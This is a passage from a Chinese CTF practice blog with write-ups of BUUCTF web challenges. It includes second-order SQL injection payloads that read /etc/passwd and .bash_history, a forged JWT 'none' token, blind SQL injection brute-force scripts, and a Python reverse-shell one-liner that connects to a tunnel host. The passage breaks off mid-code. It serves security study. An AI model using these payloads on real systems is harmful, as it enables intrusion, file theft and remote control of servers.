href="https://so.csdn.net/so/search?from=pc_blog_highlight&q=Linux">Linux</a>命令的位置：/bin,/usr/bin，默认都是全体用户使用，/sbin,/usr/sbin,默认root用户使用</p></blockquote><p>cat 读出源码（我也很想知道网上的wp没源码之前怎么想到这么绕过的</p><p><img src="/2021/06/17/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20211115003758590.png" alt="image-20211115003758590"></p><p>然后找flag在的目录</p><p><img src="/2021/06/17/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20211115003933107.png" alt="image-20211115003933107"></p><p><img src="/2021/06/17/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20211115004010321.png" alt="image-20211115004010321"></p><p>找到之后利用cat读出来</p><p><img src="/2021/06/17/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20211115004044237.png" alt="image-20211115004044237"></p><h2 id="网鼎杯-2018-Comment"><a href="#网鼎杯-2018-Comment" class="headerlink" title="[网鼎杯 2018]Comment"></a>[网鼎杯 2018]Comment</h2><p>有git泄露，用githack跑一遍，然后利用git log --reflog查看历史提交，再利用git reset回滚版本，得到原始的代码</p><pre class="language-none"><code class="language-none">&lt;?phpinclude &quot;mysql.php&quot;;session_start();if($_SESSION[&#39;login&#39;] !&#x3D; &#39;yes&#39;)&#123;    header(&quot;Location: .&#x2F;login.php&quot;);    die();&#125;if(isset($_GET[&#39;do&#39;]))&#123;switch ($_GET[&#39;do&#39;])&#123;case &#39;write&#39;:    $category &#x3D; addslashes($_POST[&#39;category&#39;]);    $title &#x3D; addslashes($_POST[&#39;title&#39;]);    $content &#x3D; addslashes($_POST[&#39;content&#39;]);    $sql &#x3D; &quot;insert into board            set category &#x3D; &#39;$category&#39;,                title &#x3D; &#39;$title&#39;,                content &#x3D; &#39;$content&#39;&quot;;    $result &#x3D; mysql_query($sql);    header(&quot;Location: .&#x2F;index.php&quot;);    break;case &#39;comment&#39;:    $bo_id &#x3D; addslashes($_POST[&#39;bo_id&#39;]);    $sql &#x3D; &quot;select category from board where id&#x3D;&#39;$bo_id&#39;&quot;;    $result &#x3D; mysql_query($sql);    $num &#x3D; mysql_num_rows($result);    if($num&gt;0)&#123;    $category &#x3D; mysql_fetch_array($result)[&#39;category&#39;];    $content &#x3D; addslashes($_POST[&#39;content&#39;]);    $sql &#x3D; &quot;insert into comment            set category &#x3D; &#39;$category&#39;,                content &#x3D; &#39;$content&#39;,                bo_id &#x3D; &#39;$bo_id&#39;&quot;;    $result &#x3D; mysql_query($sql);    &#125;    header(&quot;Location: .&#x2F;comment.php?id&#x3D;$bo_id&quot;);    break;default:    header(&quot;Location: .&#x2F;index.php&quot;);&#125;&#125;else&#123;    header(&quot;Location: .&#x2F;index.php&quot;);&#125;?&gt;</code></pre><p>输入的内容都被addslashes过滤了，但是再comment部分，category是直接从数据库中调出来的，也就是说这里存在二次注入</p><p>在发帖部分：的category里输入x&#39;,content=database(),/*</p><p><img src="/2021/06/17/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20211117213616672.png" alt="image-20211117213616672"></p><p>再在提交留言里</p><p><img src="/2021/06/17/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20211117213710038.png" alt="image-20211117213710038"></p><p>这样可以形成多行注释，注释掉原有的content字段</p><p>可以得到数据库名称</p><p><img src="/2021/06/17/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20211117213738173.png" alt="image-20211117213738173"></p><p>这时查询语句为</p><pre class="language-none"><code class="language-none">$sql &#x3D; &quot;insert into comment        set category &#x3D; &#39;x&#39;,content&#x3D;database(),&#x2F;*&#39;,            content &#x3D; &#39;*&#x2F;#&#39;,            bo_id &#x3D; &#39;$bo_id&#39;&quot;;</code></pre><p>即</p><pre class="language-none"><code class="language-none">$sql &#x3D; &quot;insert into comment        set category &#x3D; &#39;x&#39;,content&#x3D;database(),            bo_id &#x3D; &#39;$bo_id&#39;&quot;;</code></pre><p><strong>SQL读取文件</strong><br>用load_file()函数进行读取，值得注意的是读取文件并返回文件内容为字符串。要使用此函数，文件必须位于服务器主机上，必须指定完整路径的文件，而且必须有FILE权限。 该文件所有字节可读，但文件内容必须小于max_allowed_packet。如果该文件不存在或无法读取，因为前面的条件之一不满足，函数返回 NULL。</p><p><strong>.bash_history</strong></p><p>.bash_history为在unix/linux系统下保存历史命令的文件，在用户的根目录下，即<code>~/</code>处。</p><p><strong>.DS_Store文件泄露</strong></p><p>文件泄露，有一个下载至本地的<a href="https://github.com/lijiejie/ds_store_exp">脚本</a>，不过这题用不上。</p><p>在发帖之前还有个登录界面，用户名和密码前几位直接给了，剩下三位爆破得到666</p><p>&#39;,content=(select(load_file(&quot;/etc/passwd&quot;))),/*</p><p><img src="/2021/06/17/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20211117214221610.png" alt="image-20211117214221610"></p><p>（我也不知道查这里的目的是什么，但是百度其他师傅的wp都有这步</p><p>应该是为了知道.bash_histroy文件的路径</p><p><img src="/2021/06/17/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20211117214325543.png" alt="image-20211117214325543"></p><p> &#39;,content=(select(load_file(&quot;/home/www/.bash_history&quot;))),/*</p><p><img src="/2021/06/17/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20211117214355622.png" alt="image-20211117214355622"></p><p>接着再查.DS_Store</p><p> &#39;,content=(select hex(load_file(&quot;/tmp/html/.DS_Store&quot;))),/*</p><p>为了使其全部显示，要用hex编码</p><p><img src="/2021/06/17/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20211117214600582.png" alt="image-20211117214600582"></p><p>然后解码</p><p><img src="/2021/06/17/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20211117214639450.png" alt="image-20211117214639450"></p><p>看见有个flag文件</p><p>读一下</p><p>&#39;,content=(select hex(load_file(&quot;/var/www/html/flag_8946e1ff1ee3e40f.php&quot;))),/*</p><p><img src="/2021/06/17/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20211117214713821.png" alt="image-20211117214713821"></p><p>再解码，拿到flag</p><p><img src="/2021/06/17/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20211117214747130.png" alt="image-20211117214747130"></p><h2 id="HFCTF2020-EasyLogin"><a href="#HFCTF2020-EasyLogin" class="headerlink" title="[HFCTF2020]EasyLogin"></a>[HFCTF2020]EasyLogin</h2><p>注册个账号，登录，看到有个getflag但是提示权限不够</p><p>查看源码发现全是js的</p><p><img src="/2021/06/17/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20211122204752692.png" alt="image-20211122204752692"></p><p>看一下app.js</p><pre class="language-none"><code class="language-none">&#x2F;** *  或许该用 koa-static 来处理静态文件 *  路径该怎么配置？不管了先填个根目录XD *&#x2F;function login() &#123;    const username &#x3D; $(&quot;#username&quot;).val();    const password &#x3D; $(&quot;#password&quot;).val();    const token &#x3D; sessionStorage.getItem(&quot;token&quot;);    $.post(&quot;&#x2F;api&#x2F;login&quot;, &#123;username, password, authorization:token&#125;)        .done(function(data) &#123;            const &#123;status&#125; &#x3D; data;            if(status) &#123;                document.location &#x3D; &quot;&#x2F;home&quot;;            &#125;        &#125;)        .fail(function(xhr, textStatus, errorThrown) &#123;            alert(xhr.responseJSON.message);        &#125;);&#125;function register() &#123;    const username &#x3D; $(&quot;#username&quot;).val();    const password &#x3D; $(&quot;#password&quot;).val();    $.post(&quot;&#x2F;api&#x2F;register&quot;, &#123;username, password&#125;)        .done(function(data) &#123;            const &#123; token &#125; &#x3D; data;            sessionStorage.setItem(&#39;token&#39;, token);            document.location &#x3D; &quot;&#x2F;login&quot;;        &#125;)        .fail(function(xhr, textStatus, errorThrown) &#123;            alert(xhr.responseJSON.message);        &#125;);&#125;function logout() &#123;    $.get(&#39;&#x2F;api&#x2F;logout&#39;).done(function(data) &#123;        const &#123;status&#125; &#x3D; data;        if(status) &#123;            document.location &#x3D; &#39;&#x2F;login&#39;;        &#125;    &#125;);&#125;function getflag() &#123;    $.get(&#39;&#x2F;api&#x2F;flag&#39;).done(function(data) &#123;        const &#123;flag&#125; &#x3D; data;        $(&quot;#username&quot;).val(flag);    &#125;).fail(function(xhr, textStatus, errorThrown) &#123;        alert(xhr.responseJSON.message);    &#125;);&#125;</code></pre><p>提示是基于Node.js的koa框架，但是这个页面的代码并不是逻辑代码，用处不大。<br>在注释里提示静态文件处理出现问题，那么可能会出现任意文件读取漏洞</p><p>这里需要对koa框架的目录有一定的了解</p><p><img src="/2021/06/17/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20211122205026873.png" alt="image-20211122205026873"></p><p><img src="/2021/06/17/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/15873007950084a1a7b518c2216100ff330f7ed7a6.png" alt="img"></p><p>访问一下controllers路径下的api.js</p><p>额，这里赵总说是经验。。。</p><pre class="language-none"><code class="language-none">const crypto &#x3D; require(&#39;crypto&#39;);const fs &#x3D; require(&#39;fs&#39;)const jwt &#x3D; require(&#39;jsonwebtoken&#39;)const APIError &#x3D; require(&#39;..&#x2F;rest&#39;).APIError;module.exports &#x3D; &#123;    &#39;POST &#x2F;api&#x2F;register&#39;: async (ctx, next) &#x3D;&gt; &#123;        const &#123;username, password&#125; &#x3D; ctx.request.body;        if(!username || username &#x3D;&#x3D;&#x3D; &#39;admin&#39;)&#123;            throw new APIError(&#39;register error&#39;, &#39;wrong username&#39;);        &#125;        if(global.secrets.length &gt; 100000) &#123;            global.secrets &#x3D; [];        &#125;        const secret &#x3D; crypto.randomBytes(18).toString(&#39;hex&#39;);        const secretid &#x3D; global.secrets.length;        global.secrets.push(secret)        const token &#x3D; jwt.sign(&#123;secretid, username, password&#125;, secret, &#123;algorithm: &#39;HS256&#39;&#125;);        ctx.rest(&#123;            token: token        &#125;);        await next();    &#125;,    &#39;POST &#x2F;api&#x2F;login&#39;: async (ctx, next) &#x3D;&gt; &#123;        const &#123;username, password&#125; &#x3D; ctx.request.body;        if(!username || !password) &#123;            throw new APIError(&#39;login error&#39;, &#39;username or password is necessary&#39;);        &#125;        const token &#x3D; ctx.header.authorization || ctx.request.body.authorization || ctx.request.query.authorization;        const sid &#x3D; JSON.parse(Buffer.from(token.split(&#39;.&#39;)[1], &#39;base64&#39;).toString()).secretid;        console.log(sid)        if(sid &#x3D;&#x3D;&#x3D; undefined || sid &#x3D;&#x3D;&#x3D; null || !(sid &lt; global.secrets.length &amp;&amp; sid &gt;&#x3D; 0)) &#123;            throw new APIError(&#39;login error&#39;, &#39;no such secret id&#39;);        &#125;        const secret &#x3D; global.secrets[sid];        const user &#x3D; jwt.verify(token, secret, &#123;algorithm: &#39;HS256&#39;&#125;);        const status &#x3D; username &#x3D;&#x3D;&#x3D; user.username &amp;&amp; password &#x3D;&#x3D;&#x3D; user.password;        if(status) &#123;            ctx.session.username &#x3D; username;        &#125;        ctx.rest(&#123;            status        &#125;);        await next();    &#125;,    &#39;GET &#x2F;api&#x2F;flag&#39;: async (ctx, next) &#x3D;&gt; &#123;        if(ctx.session.username !&#x3D;&#x3D; &#39;admin&#39;)&#123;            throw new APIError(&#39;permission error&#39;, &#39;permission denied&#39;);        &#125;        const flag &#x3D; fs.readFileSync(&#39;&#x2F;flag&#39;).toString();        ctx.rest(&#123;            flag        &#125;);        await next();    &#125;,    &#39;GET &#x2F;api&#x2F;logout&#39;: async (ctx, next) &#x3D;&gt; &#123;        ctx.session.username &#x3D; null;        ctx.rest(&#123;            status: true        &#125;)        await next();    &#125;&#125;;</code></pre><p>赵总wp里的审计:</p><p>注册 /api/register，接受传入的 username 和 password，先判断 username 不为 admin，然后生成一个 key 来以这些信息为依据，生成一个 jwt 令牌，key 同时存入全局数组。</p><p><img src="/2021/06/17/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/15873008936cf41d35abc0ecab06b6f56706bee1b5-1024x542.png" alt="img"></p><p>登录 /api/login，接受传入的 username 和 password，然后从令牌的信息段中取 key 的 id，从程序中的全局数组取出 key，然后进行验证，验证通过之后置 session 中的 username 为登录时使用的 username。</p><p><img src="/2021/06/17/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/1587301099a4070df83cd56999e7efbafb05e2e004-1024x757.png" alt="img"></p><p>获取FLAG /api/flag，判断 session 中的用户名是否为 admin，是的话就直接给 flag。</p><p><img src="/2021/06/17/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/1587301284fe28eb6eb5a5362ed0749a45de8eb406-1024x468.png" alt="img"></p><p>可以看到信息是用 jwt 令牌储存的，使用 jsonwebtoken 库来操作，这里用的是 HS256加密，但经过测试发现，当加密时使用的是 none 方法，验证时只要密钥处为 undefined 或者空之类的，即便后面的算法指名为 HS256，验证也还是按照 none 来验证通过，这样很轻松地就可以伪造一个 username 为 admin 的 jwttoken 了。</p><p>在登录界面抓包后边这串就是jwt（当时忘了截图，这是改完jwt之后的了</p><p><img src="/2021/06/17/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20211122210021834.png" alt="image-20211122210021834"></p><p>之后在<a href="https://jwt.io/">JSON Web Tokens - jwt.io</a>里解码</p><p><img src="/2021/06/17/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20211122210147429.png" alt="image-20211122210147429"></p><p>接下来也是赵总的分析：</p><p>回到源程序逻辑中，若想让这里的密钥 key为空，就需要修改上面的 secretid。那么就尝试修改 secretid，使其无法作为全局变量 secrets 数组的索引，那么 secret 就会为空了。</p><p><a href="https://www.zhaoj.in/wp-content/uploads/2020/04/15873021389c8e46ed2ff4ebdc4215e90585dbcd31.png"><img src="/2021/06/17/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/15873021389c8e46ed2ff4ebdc4215e90585dbcd31-1024x245.png" alt="img"></a></p><p>注意，这里还有一个验证，要求 sid 不能为 undefined，null，并且必须在全局变量 secrets 数组的长度和 0 之间。乍看之下没有操作空间，怎么整都会取出 密钥 key。但别忘了 JavaScript 是一门弱类型语言，NodeJS 都是 JS 的语法，那自然也是咯。所以我们只要选择恰当的数据来绕过这个判断即可。可以做一个小实验来验证我们的想法。</p><p><img src="/2021/06/17/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/158730244598990809373d961e187fa7d0a66cc4ce-1024x459.png" alt="img">一个小实验，空数组与数字比较永远为真，当然用空字符串之类的也可以</p><p>最后利用python的PyJWT库来加密</p><p><img src="/2021/06/17/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20211122210434868.png" alt="image-20211122210434868"></p><p>抓包再放包就可以读取这个flag</p><p><img src="/2021/06/17/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20211122210523101.png" alt="image-20211122210523101"></p><p><a href="https://www.zhaoj.in/read-6512.html">虎符 CTF Web 部分 Writeup – glzjin (zhaoj.in)</a></p><h2 id="GYCTF2020-Ezsqli"><a href="#GYCTF2020-Ezsqli" class="headerlink" title="[GYCTF2020]Ezsqli"></a>[GYCTF2020]Ezsqli</h2><p>or被过滤了，没法用information查表了，但是可以用</p><pre class="language-none"><code class="language-none">1&amp;&amp;ascii(substr((select group_concat(table_name)from sys.x$schema_flattened_keys where table_schema&#x3D;database()),1,1))&#x3D;1032||ascii(substr((select group_concat(table_name) from sys.schema_table_statistics_with_buffer where table_schema&#x3D;database()),&#123;&#125;,1))&#x3D;&#123;&#125;.format()</code></pre><p>正确的时候返回Nu1L，错误时返回V&amp;N</p><p>爆表脚本</p><pre class="language-none"><code class="language-none">import requestsurl &#x3D; &quot;http:&#x2F;&#x2F;c581ac4d-17cf-437c-abc6-b0153526b868.node4.buuoj.cn:81&#x2F;&quot;payload &#x3D; &#39;2||ascii(substr((select group_concat(table_name)from sys.x$schema_flattened_keys where table_schema&#x3D;database()),&#123;&#125;,1))&gt;&#123;&#125;&#39;database&#x3D; &#39;&#39;for i in range(1,1000):low &#x3D; 32heigh &#x3D; 128mid &#x3D; (low + heigh) &#x2F;&#x2F; 2while (low &lt; heigh):payload1 &#x3D; payload.format(i,mid)post_data &#x3D; &#123;&#39;id&#39;: payload1&#125;r &#x3D; requests.post(url,data&#x3D;post_data)print(payload1)if &quot;Nu1L&quot; in r.text:low &#x3D; mid + 1else:heigh &#x3D; midmid &#x3D; (low + heigh) &#x2F;&#x2F; 2if mid &#x3D;&#x3D; 32:breakdatabase +&#x3D;chr(mid)print(database)</code></pre><p><img src="/2021/06/17/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20211123202113511.png" alt="image-20211123202113511"></p><p>得到表名后，拿不到列名，这里可以用无列名注入</p><p>先贴payload</p><p>2||((select 1,&quot;{}&quot;)&gt;(select * from f1ag_1s_h3r3_hhhhh))</p><p>采用了字符偏移</p><ul><li><p>按位去比较，如果爆破字符与flag的第一个字符相等，就向后继续，大了小了都要继续当前的循环，直到找到合适的字符</p></li><li><p>所以最后的mid要减一才是正确的字符</p></li><li><p>这里我们传入十六进制，mysql会自动将十六进制转为字符</p></li><li><p>mysql不区分大小写，比较的时候O(0x4f)的ascii比f(0x66)的ascii小，但是比较的结果是O比f大 </p></li></ul><p><img src="/2021/06/17/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20211123202924585.png" alt="image-20211123202924585"></p><p>这里要和flag的表的列数一样</p><p>最后跑一下拿flag</p><pre class="language-none"><code class="language-none">import requestsurl &#x3D; &quot;http:&#x2F;&#x2F;c581ac4d-17cf-437c-abc6-b0153526b868.node4.buuoj.cn:81&#x2F;index.php&quot;#payload &#x3D; &#39;2||ascii(substr((select group_concat(table_name)from sys.x$schema_flattened_keys where table_schema&#x3D;database()),&#123;&#125;,1))&gt;&#123;&#125;&#39;payload &#x3D; &#39;2||((select 1,&quot;&#123;&#125;&quot;)&gt;(select * from f1ag_1s_h3r3_hhhhh))&#39;change &#x3D; &#39;&#39;database&#x3D; &#39;&#39;for j in range(1,100):for i in range(32,128):change &#x3D; database+chr(i)payload1 &#x3D; payload.format(change)print(payload1)data &#x3D; &#123;&#39;id&#39;: payload1&#125;r &#x3D; requests.post(url,data&#x3D;data)if &#39;Nu1L&#39; in r.text:database +&#x3D; chr(i-1)print(database)break</code></pre><p><img src="/2021/06/17/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20211123205558046.png" alt="image-20211123205558046"></p><h2 id="b01lers2020-Welcome-to-Earth"><a href="#b01lers2020-Welcome-to-Earth" class="headerlink" title="[b01lers2020]Welcome to Earth"></a>[b01lers2020]Welcome to Earth</h2><p>抓包之后一直往下走</p><p><img src="/2021/06/17/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20211123211557104.png" alt="image-20211123211557104"></p><p><img src="/2021/06/17/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20211123211609605.png" alt="image-20211123211609605"></p><p><img src="/2021/06/17/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20211123211625629.png" alt="image-20211123211625629"></p><p>源码里找不到就去看js</p><p><img src="/2021/06/17/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20211123211646833.png" alt="image-20211123211646833"></p><p>最后可以找到一个</p><p><img src="/2021/06/17/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20211123211708969.png" alt="image-20211123211708969"></p><p>随机排列组合得到flag</p><pre class="language-none"><code class="language-none">from itertools import permutationsflag &#x3D; [&quot;&#123;hey&quot;, &quot;_boy&quot;, &quot;aaaa&quot;, &quot;s_im&quot;, &quot;ck!&#125;&quot;, &quot;_baa&quot;, &quot;aaaa&quot;, &quot;pctf&quot;]item &#x3D; permutations(flag)#对flag全排列，返回的是iterators（迭代器）for i in item:k &#x3D; &#39;&#39;.join(i)#join连接成为字符串if k[-1] &#x3D;&#x3D;&#39;&#125;&#39; and k[0:13] &#x3D;&#x3D; &#39;pctf&#123;hey_boys&#39;:&#x2F;&#x2F;这里还可以用python的startswich方法判断是否是pctf&#123;hey开头&#x2F;&#x2F;if k.startswith(&#39;pctf&#123;hey_boys&#39;) and k[-1] &#x3D;&#x3D;&#39;&#125;&#39;:print(k)</code></pre><p><img src="/2021/06/17/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20211123211727781.png" alt="image-20211123211727781"></p><h2 id="watevrCTF-2019-Cookie-Store"><a href="#watevrCTF-2019-Cookie-Store" class="headerlink" title="[watevrCTF-2019]Cookie Store"></a>[watevrCTF-2019]Cookie Store</h2><p>抓session，base64解码把金额改成100，放包</p><h2 id="网鼎杯-2020-白虎组-PicDown"><a href="#网鼎杯-2020-白虎组-PicDown" class="headerlink" title="[网鼎杯 2020 白虎组]PicDown"></a>[网鼎杯 2020 白虎组]PicDown</h2><p><img src="/2021/06/17/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20211124200900405.png" alt="image-20211124200900405"></p><p>源码没东西，只有个url的get参数，还以为是ssrf之类的，搜了下wp，这里可能是因为环境原因，有个非预期解</p><p>非预期解：</p><p>有文件读取，直接url=/flag就能下载一个beautiful.jpg,改成txt就能看见flag</p><p><img src="/2021/06/17/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20211124201030250.png" alt="image-20211124201030250"></p><p>预期解：</p><p><strong>/proc/self/目录的意义</strong></p><p>我们都知道可以通过/proc/$pid/来获取指定进程的信息，例如内存映射、CPU绑定信息等等。如果某个进程想要获取本进程的系统信息，就可以通过进程的pid来访问/proc/$pid/目录。但是这个方法还需要获取进程pid，在fork、daemon等情况下pid还可能发生变化。为了更方便的获取本进程的信息，linux提供了/proc/self/目录，这个目录比较独特，不同的进程访问该目录时获得的信息是不同的，内容等价于/proc/本进程pid/。进程可以通过访问/proc/self/目录来获取自己的系统信息，而不用每次都获取pid。</p><p><img src="/2021/06/17/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20211124202121899.png" alt="image-20211124202121899"></p><p>读一下app.py</p><p>url=app.py</p><pre class="language-none"><code class="language-none">from flask import Flask, Responsefrom flask import render_templatefrom flask import requestimport osimport urllibapp &#x3D; Flask(__name__)SECRET_FILE &#x3D; &quot;&#x2F;tmp&#x2F;secret.txt&quot;f &#x3D; open(SECRET_FILE)SECRET_KEY &#x3D; f.read().strip()os.remove(SECRET_FILE)@app.route(&#39;&#x2F;&#39;)def index():    return render_template(&#39;search.html&#39;)@app.route(&#39;&#x2F;page&#39;)def page():    url &#x3D; request.args.get(&quot;url&quot;)    try:        if not url.lower().startswith(&quot;file&quot;):            res &#x3D; urllib.urlopen(url)            value &#x3D; res.read()            response &#x3D; Response(value, mimetype&#x3D;&#39;application&#x2F;octet-stream&#39;)            response.headers[&#39;Content-Disposition&#39;] &#x3D; &#39;attachment; filename&#x3D;beautiful.jpg&#39;            return response        else:            value &#x3D; &quot;HACK ERROR!&quot;    except:        value &#x3D; &quot;SOMETHING WRONG!&quot;    return render_template(&#39;search.html&#39;, res&#x3D;value)@app.route(&#39;&#x2F;no_one_know_the_manager&#39;)def manager():    key &#x3D; request.args.get(&quot;key&quot;)    print(SECRET_KEY)    if key &#x3D;&#x3D; SECRET_KEY:        shell &#x3D; request.args.get(&quot;shell&quot;)        os.system(shell)        res &#x3D; &quot;ok&quot;    else:        res &#x3D; &quot;Wrong Key!&quot;    return resif __name__ &#x3D;&#x3D; &#39;__main__&#39;:    app.run(host&#x3D;&#39;0.0.0.0&#39;, port&#x3D;8080)</code></pre><p>可以看到<code>no_one_know_the_manager</code>中要匹配SECRET_KEY，然后执行shell，但是SECRET_KEY所在的secret.txt被删掉了</p><p>但是这个文件是用open打开的，会创建文件描述符。</p><p>我们读这个文件描述符中的内容就好了此处可以通过<code>/proc/pid/fd/</code>读取，这个目录包含了进程打开的每一个文件的链接</p><p><img src="/2021/06/17/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20211124203011498.png" alt="image-20211124203011498"></p><p>拿到key的内容，要url编码，但是shell执行的命令不会返回，这里使用反弹shell的方式，在根目录下读取flag</p><p><img src="/2021/06/17/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20211124203433334.png" alt="image-20211124203433334"></p><hr><p>nmd弹了几个小时终于弹出来了</p><p><img src="/2021/06/17/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/G0AOG@8YB%5BBZ_FAPY%5BLK8VR.png" alt="img"></p><p>这玩意要公网ip，搜了一圈没一个说这个事的，</p><p>没公网ip，搞了个端口映射后的公网</p><p><a href="https://blog.csdn.net/weixin_41598660/article/details/105254229">(23条消息) 端口映射后的公网反弹shell_来到了学渣的博客-CSDN博客</a></p><p><a href="https://natapp.cn/register">https://natapp.cn/register</a></p><p><img src="/2021/06/17/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20211125001711038.png" alt="image-20211125001711038"></p><p><img src="/2021/06/17/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20211125001738005.png" alt="image-20211125001738005"></p><p>把本地的8082端口映射到公网</p><p>把这个payload当shell参数的值打进去</p><pre class="language-none"><code class="language-none">python -c &quot;import os,socket,subprocess;s&#x3D;socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&#39;server.natappfree.cc&#39;,xxxxx));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p&#x3D;subprocess.call([&#39;&#x2F;bin&#x2F;bash&#39;,&#39;-i&#39;]);&quot;</code></pre><p>然后在Ubuntu里监听8082端口，从根目录里找到flag</p><p><img src="/2021/06/17/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/G0AOG@8YB%5BBZ_FAPY%5BLK8VR.png" alt="img"></p><p><img src="/2021/06/17/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20211125002051230.png" alt="image-20211125002051230"></p><p>泪目</p><h2 id="SWPUCTF-2018-SimplePHP"><a href="#SWPUCTF-2018-SimplePHP" class="headerlink" title="[SWPUCTF 2018]SimplePHP"></a>[SWPUCTF 2018]SimplePHP</h2><p>文件上传，但是这个flie参数感觉可以直接文件读取</p><p><img src="/2021/06/17/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20211125203202419.png" alt="image-20211125203202419"></p><p>index.php</p><pre class="language-none"><code class="language-none">&lt;?php header(&quot;content-type:text&#x2F;html;charset&#x3D;utf-8&quot;);  include &#39;base.php&#39;;?&gt; </code></pre><p>base.php</p><pre class="language-none"><code class="language-none">&lt;?php     session_start(); ?&gt; &lt;!DOCTYPE html&gt; &lt;html&gt; &lt;head&gt;     &lt;meta charset&#x3D;&quot;utf-8&quot;&gt;     &lt;title&gt;web3&lt;&#x2F;title&gt;     &lt;link rel&#x3D;&quot;stylesheet&quot; href&#x3D;&quot;https:&#x2F;&#x2F;cdn.staticfile.org&#x2F;twitter-bootstrap&#x2F;3.3.7&#x2F;css&#x2F;bootstrap.min.css&quot;&gt;     &lt;script src&#x3D;&quot;https:&#x2F;&#x2F;cdn.staticfile.org&#x2F;jquery&#x2F;2.1.1&#x2F;jquery.min.js&quot;&gt;&lt;&#x2F;script&gt;     &lt;script src&#x3D;&quot;https:&#x2F;&#x2F;cdn.staticfile.org&#x2F;twitter-bootstrap&#x2F;3.3.7&#x2F;js&#x2F;bootstrap.min.js&quot;&gt;&lt;&#x2F;script&gt; &lt;&#x2F;head&gt; &lt;body&gt;     &lt;nav class&#x3D;&quot;navbar navbar-default&quot; role&#x3D;&quot;navigation&quot;&gt;         &lt;div class&#x3D;&quot;container-fluid&quot;&gt;         &lt;div class&#x3D;&quot;navbar-header&quot;&gt;             &lt;a class&#x3D;&quot;navbar-brand&quot; href&#x3D;&quot;index.php&quot;&gt;首页&lt;&#x2F;a&gt;         &lt;&#x2F;div&gt;             &lt;ul class&#x3D;&quot;nav navbar-nav navbra-toggle&quot;&gt;                 &lt;li class&#x3D;&quot;active&quot;&gt;&lt;a href&#x3D;&quot;file.php?file&#x3D;&quot;&gt;查看文件&lt;&#x2F;a&gt;&lt;&#x2F;li&gt;                 &lt;li&gt;&lt;a href&#x3D;&quot;upload_file.php&quot;&gt;上传文件&lt;&#x2F;a&gt;&lt;&#x2F;li&gt;             &lt;&#x2F;ul&gt;             &lt;ul class&#x3D;&quot;nav navbar-nav navbar-right&quot;&gt;                 &lt;li&gt;&lt;a href&#x3D;&quot;index.php&quot;&gt;&lt;span class&#x3D;&quot;glyphicon glyphicon-user&quot;&gt;&lt;&#x2F;span&gt;&lt;?php echo $_SERVER[&#39;REMOTE_ADDR&#39;];?&gt;&lt;&#x2F;a&gt;&lt;&#x2F;li&gt;             &lt;&#x2F;ul&gt;         &lt;&#x2F;div&gt;     &lt;&#x2F;nav&gt; &lt;&#x2F;body&gt; &lt;&#x2F;html&gt; &lt;!--flag is in f1ag.php--&gt;</code></pre><p>file.php</p><pre class="language-none"><code class="language-none">&lt;?php header(&quot;content-type:text&#x2F;html;charset&#x3D;utf-8&quot;);  include &#39;function.php&#39;; include &#39;class.php&#39;; ini_set(&#39;open_basedir&#39;,&#39;&#x2F;var&#x2F;www&#x2F;html&#x2F;&#39;); $file &#x3D; $_GET[&quot;file&quot;] ? $_GET[&#39;file&#39;] : &quot;&quot;; if(empty($file)) &#123;     echo &quot;&lt;h2&gt;There is no file to 